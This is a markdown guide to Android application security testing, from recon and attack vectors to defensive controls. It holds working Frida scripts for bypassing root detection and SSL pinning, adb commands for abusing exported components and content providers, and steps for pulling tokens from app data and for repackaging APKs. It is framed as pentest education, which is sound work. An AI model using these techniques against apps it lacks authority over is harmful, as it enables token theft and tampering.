# Android Security

> [!NOTE]
> This document is for authorized security testing, educational purposes, and defensive engineering only. Do not use these techniques against applications you do not own or have explicit permission to test.

## 1. Overview

Android is a Linux-based mobile OS with a layered security model:

- **Application sandbox.** Each app runs under a unique Linux UID. Files in `/data/data/<package>/` are owned by that UID and inaccessible to other apps.
- **SELinux (since Android 4.3, enforcing since 5.0).** Mandatory access control on top of the Unix permissions. Even root can be constrained (depending on the SELinux domain).
- **Permission model.** Runtime permissions (since 6.0) for dangerous capabilities (camera, location, contacts). Normal permissions are granted at install time.
- **IPC boundaries.** Activities, Services, Broadcast Receivers, and Content Providers form the inter-process communication surface. Each can be exported (accessible to other apps) or private.
- **Code signing.** APKs are signed; the signature is validated at install time. Since Android 7.0, APK Signature Scheme v2 is used; since 9.0, v3 (key rotation).

**What this means for security testing:**

- The client is fully controlled by the attacker (rooted device or emulator).
- The attack surface is the app code + the IPC surface + the backend API.
- The main defensive controls are: correct `exported` flags, permission checks, Network Security Config, Keystore, code obfuscation (R8), and integrity attestation (Play Integrity).

## 2. Reconnaissance / Enumeration

### 2.1 APK structure

An APK is a ZIP archive. Key entries:

| Path | Purpose |
|------|---------|
| `AndroidManifest.xml` | Binary XML; declares components, permissions, SDK versions |
| `classes.dex` (and `.dex.2`, etc.) | Dalvik bytecode |
| `resources.arsc` | Compiled resources |
| `res/` | Layouts, drawables, strings (compiled) |
| `lib/<abi>/` | Native libraries (`.so`) |
| `META-INF/` | Signature files (v1 scheme) |
| `assets/` | Raw files bundled with the app |
| `res/xml/network_security_config.xml` | Cleartext/pinning rules |

### 2.2 Static analysis toolkit

```bash
# Decode resources and manifest (apktool)
apktool d app.apk -o app-decoded

# Decompile DEX to Java (jadx)
jadx -d app-jadx app.apk

# Alternative: dex to jar, then javap
d2j-dex2jar app.apk -o app.jar
```

**Expected output:** `app-decoded/AndroidManifest.xml` readable as XML; `app-jadx/sources/` contains decompiled Java/Kotlin.

### 2.3 Manifest inspection

Look for:

- `<uses-permission>` - what capabilities does the app request?
- `android:exported="true"` on activities, services, receivers, providers.
- `android:debuggable="true"` (should be false in release).
- `android:allowBackup="true"` (data extraction via `adb backup`).
- `android:networkSecurityConfig` - cleartext / pinning rules.
- `<intent-filter>` - deep links, custom schemes.
- `<provider android:grantUriPermissions="true">` - FileProvider misconfigurations.

```bash
# Quick dump of exported components (decoded manifest)
grep -E 'android:exported="true"' app-decoded/AndroidManifest.xml
```

**Expected output:** List of exported components with their class names and intent filters.

### 2.4 Hardcoded secrets

```bash
# Search decompiled sources for common secret patterns
grep -rE "(api[_-]?key|secret|token|password|Bearer)" app-jadx/sources/ | head -50
```

**Expected output:** Suspicious strings; verify each in context (some may be test values, not live secrets).

### 2.5 Dynamic reconnaissance

```bash
# Install and launch
adb install app.apk
adb shell monkey -p com.example.app -c android.intent.category.LAUNCHER 1

# Logs
adb logcat | grep -i com.example.app

# Shell on a rooted device
adb shell
su
```

**Expected output:** App launches; logcat shows the app's tag; `su` gives `#` prompt on a rooted device.

## 3. Common Attack Vectors

### 3.1 Exported components

An exported activity can be launched by any app on the device with arbitrary `Intent` extras.

```bash
adb shell am start -n com.example.app/.ExportedActivity --es "token" "attacker_value"
```

**Expected output:** Activity launches with attacker-controlled extras. If it performs an action (e.g. password reset, admin toggle) based on those extras without server-side validation, that is a vulnerability.

### 3.2 Content provider leaks

A provider with `android:exported="true"` and no `readPermission` / `writePermission` allows any app to query or modify it.

```bash
adb shell content query --uri content://com.example.app.provider/users
adb shell content insert --uri content://com.example.app.provider/users --bind username:s:attacker
```

**Expected output:** Rows of data (usernames, emails, tokens) returned; or successful insert.

### 3.3 Intent redirection

If an activity receives an `Intent` and forwards it (e.g. `startActivity(getIntent().getParcelableExtra("next"))`) without validation, an attacker can redirect it to a private component.

```bash
adb shell am start -n com.example.app/.RedirectActivity --es "next" "intent:#Intent;component=com.example.app/.PrivateAdminActivity;end"
```

**Expected output:** Private activity launches - confirms redirect.

### 3.4 WebView misconfigurations

Common issues:

- `setJavaScriptEnabled(true)` with `addJavascriptInterface()` -> JS bridge to native code.
- `setAllowFileAccess(true)` + `loadUrl("file:///...")` -> local file read.
- `setAllowUniversalAccessFromFileURLs(true)` -> SOP bypass.
- Missing `shouldOverrideUrlLoading` -> navigation to `intent://` or `file://`.

```javascript
// Example: hook addJavascriptInterface to log the bridge name and object class
Java.perform(function() {
    var WebView = Java.use("android.webkit.WebView");
    WebView.addJavascriptInterface.implementation = function(obj, name) {
        console.log("[*] addJavascriptInterface: " + name + " -> " + obj.getClass().getName());
        return this.addJavascriptInterface(obj, name);
    };
});
```

**Expected output:** Console log shows the JS bridge name and the native object class.

### 3.5 Deep links

Custom URL schemes (`myapp://`) and App Links (`https://` with `autoVerify="true"`) can be hijacked if another app registers the same scheme.

```bash
adb shell am start -a android.intent.action.VIEW -d "myapp://reset?token=attacker"
```

**Expected output:** App opens the deep-link handler. Test whether the handler validates the token, the user, and the action server-side.## 4. Exploitation Recipes

### 4.1 Bypass root detection (Frida)

Most root checks call `RootBeer`, `SafetyNet`, or check for the `su` binary. Hook the entry points and force benign return values.

```javascript
Java.perform(function() {
    // RootBeer
    try {
        var RootBeer = Java.use("com.scottyab.rootbeer.RootBeer");
        RootBeer.isRooted.implementation = function() {
            console.log("[*] RootBeer.isRooted() -> false");
            return false;
        };
        RootBeer.isRootedWithoutBusyBoxCheck.implementation = function() {
            console.log("[*] RootBeer.isRootedWithoutBusyBoxCheck() -> false");
            return false;
        };
    } catch (e) { console.log("[!] RootBeer not found"); }

    // Generic File.exists check for /system/bin/su, /system/xbin/su, etc.
    var File = Java.use("java.io.File");
    File.exists.implementation = function() {
        var path = this.getAbsolutePath();
        if (path.indexOf("/su") !== -1 || path.indexOf("magisk") !== -1) {
            console.log("[*] File.exists blocked: " + path);
            return false;
        }
        return this.exists();
    };
});
```

**Expected output:** App starts without root warning; console shows `[*] RootBeer.isRooted() -> false` and blocked `su` paths.

### 4.2 Bypass SSL pinning (universal TrustManager hook)

```javascript
Java.perform(function() {
    var X509TrustManager = Java.use("javax.net.ssl.X509TrustManager");
    var SSLContext = Java.use("javax.net.ssl.SSLContext");

    var TrustAllCerts = Java.registerClass({
        name: "com.attacker.TrustAllCerts",
        implements: [X509TrustManager],
        methods: {
            checkClientTrusted: function(chain, authType) {},
            checkServerTrusted: function(chain, authType) {},
            getAcceptedIssuers: function() { return []; }
        }
    });

    var TrustAllCertsArray = [TrustAllCerts.$new()];
    var SSLContext_init = SSLContext.init.overload(
        "[Ljavax.net.ssl.KeyManager;",
        "[Ljavax.net.ssl.TrustManager;",
        "java.security.SecureRandom"
    );
    SSLContext_init.implementation = function(keyManager, trustManager, secureRandom) {
        console.log("[*] SSLContext.init() -> trust-all");
        SSLContext_init.call(this, keyManager, TrustAllCertsArray, secureRandom);
    };
});
```

Run: `frida -U -f com.example.app -l ssl-bypass.js --no-pause`

**Expected output:** `[*] SSLContext.init() -> trust-all`; `mitmproxy` shows decrypted HTTPS.

### 4.3 Extract app data on rooted device

```bash
adb shell
su
cd /data/data/com.example.app
ls -la
cat shared_prefs/*.xml
sqlite3 databases/app.db ".tables"
sqlite3 databases/app.db "SELECT * FROM users;"
```

**Expected output:** Plaintext preferences (tokens, API keys) and SQLite rows.

### 4.4 Extract app data via adb backup (non-root, older Android)

```bash
adb backup -f backup.ab -apk com.example.app
dd if=backup.ab bs=24 skip=1 | openssl zlib -d > backup.tar
tar xf backup.tar
ls apps/com.example.app/
```

**Expected output:** `apps/com.example.app/` contains `_manifest`, `db/`, `sp/`, `f/` directories with app data.

**Note:** `adb backup` is disabled by default on Android 12+ unless the app sets `android:allowBackup="true"` and the OEM allows it. On modern devices, prefer Frida-based extraction or rooted `adb shell`.

### 4.5 Intent redirection to private component

```bash
adb shell am start -n com.example.app/.RedirectActivity \
  --es "next" "intent:#Intent;component=com.example.app/.PrivateAdminActivity;end"
```

**Expected output:** `Starting: Intent { cmp=com.example.app/.PrivateAdminActivity }` - private activity launches.

### 4.6 JavaScript bridge abuse (WebView)

If the app exposes a bridge via `addJavascriptInterface`, you can call native methods from injected JS (XSS in a WebView, or `javascript:` URL in a deep link).

```javascript
// Inject into the WebView via a deep link or XSS
// Example: bridge object named "Android"
Android.sensitiveMethod("attacker_argument");
```

**Expected output:** Native method executes with attacker-controlled argument (e.g. file write, token read).

## 5. Post-Exploitation

- **Data exfiltration:** pull `/data/data/<package>/` (rooted) or use Frida to dump `SharedPreferences`, SQLite, and the app's private files.
- **Token theft:** extract session tokens from `shared_prefs`, SQLite, or memory (Frida `Java.use("...").<field>.value`).
- **Backend pivot:** replay the token against the API (see `01 Mobile Security Fundamentals.md`, section 5.3).
- **Persistence:** on a rooted device, install a Magisk module that hooks the app on every start; on non-rooted, no reliable persistence without user interaction.
- **Repackaging:** decompile with `apktool`, patch `smali`, rebuild with `apktool b`, sign with `apksigner`, install with `adb install -r`. Used to bypass license checks, inject ads, or distribute malware (illegal outside authorized testing).

## 6. Preventive Controls (AppSec)

| Risk | Control |
|------|---------|
| Exported components | `android:exported="false"` unless required; if required, enforce a signature-level permission |
| Content providers | `android:exported="false"` + `grantUriPermissions` scoped via FileProvider |
| Intent redirection | Validate the `Intent` component and extras before `startActivity` |
| WebView | `setJavaScriptEnabled(false)` if not needed; if needed, no `addJavascriptInterface`, `setAllowFileAccess(false)`, `setAllowUniversalAccessFromFileURLs(false)`, override `shouldOverrideUrlLoading` |
| Deep links | `autoVerify="true"` for App Links; validate token + user + action server-side |
| Data storage | Android Keystore for keys; `EncryptedSharedPreferences` for tokens; `android:allowBackup="false"` for sensitive apps |
| Network | `network_security_config.xml` with `cleartextTrafficPermitted="false"`; certificate pinning (public-key pinning) |
| Code integrity | R8/ProGuard obfuscation; Play Integrity API; detect Frida/Xposed and degrade gracefully |
| Debuggable | `android:debuggable="false"` in release builds (default) |

## 7. Detection Controls (AppSec)

- **Play Integrity API:** server-side verification of the `integrityToken` (app, device, account). Reject requests from rooted/emulated devices unless the risk is acceptable.
- **RASP:** runtime detection of Frida (`frida-server` process, `27042` port, `frida` named pipes), Xposed (`de.robv.android.xposed`), debugger (`Debug.isDebuggerConnected()`). Respond by degrading features, not hard-blocking (hard block = easy bypass signal).
- **Pinning failure telemetry:** log pinning failures to the backend (rate-limited, no sensitive data).
- **Server-side anomaly detection:** impossible travel, unusual API call patterns, replay detection.
- **Log hygiene:** never log tokens, PII, or full URLs with query strings.

## 8. Verification (AppSec)

- **MASVS mapping:** STORAGE (Keystore, backup), CRYPTO (algorithms, key sizes), AUTH (biometric binding, token lifetime), NETWORK (TLS, pinning), PLATFORM (exported, WebView, deep links), CODE (R8, debuggable), RESILIENCE (Play Integrity, RASP), PRIVACY (data minimization).
- **MASTG tests:** run the Android test cases in MASTG for each MASVS category.
- **Automated:** MobSF static scan in CI; `semgrep` with `android` rules.
- **Manual pentest:** rooted device or emulator with Frida; `mitmproxy` for traffic; `jadx` + `apktool` for static.

## 9. References

- Android Security Documentation - https://source.android.com/docs/security
- Android Network Security Config - https://developer.android.com/privacy-and-security/security-config
- Android Keystore - https://developer.android.com/privacy-and-security/keystore
- Play Integrity API - https://developer.android.com/google/play/integrity
- OWASP MASTG (Android) - https://mas.owasp.org/MASTG/Android/
- OWASP MASVS - https://mas.owasp.org/MASVS/
- Frida - https://frida.re/docs/android/
- jadx - https://github.com/skylot/jadx
- apktool - https://apktool.org/
- MobSF - https://github.com/MobSF/Mobile-Security-Framework-MobSF